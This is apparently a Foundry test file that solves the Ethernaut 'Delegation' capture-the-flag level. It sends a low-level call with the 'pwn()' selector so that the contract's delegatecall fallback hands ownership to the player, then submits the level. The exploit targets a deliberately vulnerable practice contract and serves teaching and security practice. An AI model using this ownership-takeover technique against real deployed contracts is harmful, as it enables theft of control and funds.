// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/6-Delegation/Delegation.sol";
import "../src/6-Delegation/DelegationFactory.sol";

contract DelegationTest is Test {
    Ethernaut ethernaut;
    DelegationFactory level;
    Delegation instance;
    address player = address(123456);
    address instanceAddress;

    function setUp() public {
        ethernaut = new Ethernaut();
        level = new DelegationFactory();
        ethernaut.registerLevel(level);
        startHoax(player, player);
        instanceAddress = ethernaut.createLevelInstance(level);
        instance = Delegation(payable(instanceAddress));
    }

    function testDelegationHack() public {
        (bool success, ) = payable(instanceAddress).call(
            abi.encodeWithSignature("pwn()")
        );
        assertTrue(success);

        emit log_named_address("delegation owner:", instance.owner());

        bool levelCompleted = ethernaut.submitLevelInstance(
            payable(instanceAddress)
        );
        assert(levelCompleted);
    }
}
